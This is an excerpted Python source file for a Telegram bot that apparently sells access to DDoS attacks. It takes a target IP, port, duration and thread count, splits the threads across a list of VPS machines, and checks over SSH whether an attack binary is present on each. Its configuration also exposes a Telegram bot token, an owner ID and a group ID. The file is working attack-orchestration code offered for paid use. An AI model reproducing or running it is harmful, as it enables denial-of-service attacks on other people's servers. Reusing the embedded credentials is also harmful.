...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7043057158:AAGi85u51pztaNdUX76R5MuD-30ZOj27v4o'
OWNER_ID = 7501870513  # 👈 Put your real Telegram user ID here
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-1002512411419]
MAX_THREADS = 1000
max_duration = 120
bot_open = False
OWNER_USERNAME = "PRIMExBUGGI1"
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    if len(args) != 4:  # Now 4 arguments (ip, port, duration, threads)
        current_display_name = get_display_name_from_update(update)
        await update.message.reply_text(
    ...
    if threads > max_allowed_threads:
        current_display_name = get_display_name_from_update(update)
        await update.message.reply_text(
            f"❌ *Threads exceed the max limit ({max_allowed_threads})!*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    ...
    # Get available VPS (not currently attacking same target)
    available_vps = []
    target = f"{ip}:{port}"
    
    for vps in VPS_LIST:
        vps_ip = vps[0]
        # Check if this VPS is already attacking this target
        is_busy = False
        for attack_id, attack_info in running_attacks.items():
            if attack_info['vps_ip'] == vps_ip and attack_info['target'] == target:
                is_busy = True
                break
        if not is_busy:
            available_vps.append(vps)
    
    if not available_vps:
        await update.message.reply_text(
            "❌ *All VPS are currently busy attacking this target!*\n"
            "Please try again later or use a different target.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Calculate threads per VPS
    threads_per_vps = threads // len(available_vps)
    remaining_threads = threads % len(available_vps)
    ...
    start_message = await update.message.reply_text(
        ...
        f"🧵 *Threads*: {threads}\n"
        f"🖥️ *Using VPS*: {len(available_vps)}\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
    ...
    try:
        # Start a thread for each available VPS
...
async def show_vps_status(update: Update, context: CallbackContext):
    ...
    for i, vps in enumerate(VPS_LIST):
        ...
        try:
            ...
            # Check binary status
            stdin, stdout, stderr = ssh.exec_command(f'ls -la {BINARY_PATH} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            ...
            if "Not found" in output:
                ...
                stdin, stdout, stderr = ssh.exec_command(f'{BINARY_PATH} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ Binary present"
                else:
    ...
    # Create summary
    summary = (
        f"📊 *VPS Status Summary*\n"
        f"🟢 Online: {online_vps}\n"
        f"🟡 Busy: {busy_vps}\n"
        f"🔴 Offline: {offline_vps}\n"
        f"Total: {len(VPS_LIST)}\n\n"
        f"👑 *Bot Owner:* {escape_markdown(get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None), version=2)}"
    )
    ...
    if len(full_message) > 4000:
        # Send summary first
        await message.edit_text(summary, parse_mode='MarkdownV2')
        
        # Split status messages into chunks
        chunk_size = 10  # Number of VPS statuses per message
        for i in range(0, len(status_messages), chunk_size):
            chunk = status_messages[i:i + chunk_size]
            await update.message.reply_text("\n".join(chunk), parse_mode='MarkdownV2')
    else:
        try:
            await message.edit_text(full_message, parse_mode='MarkdownV2')
        except Exception as e:
...
# Add this handler with your other handlers
    ...
    application.add_handler(MessageHandler(filters.Text("VPS Status"), show_vps_status))
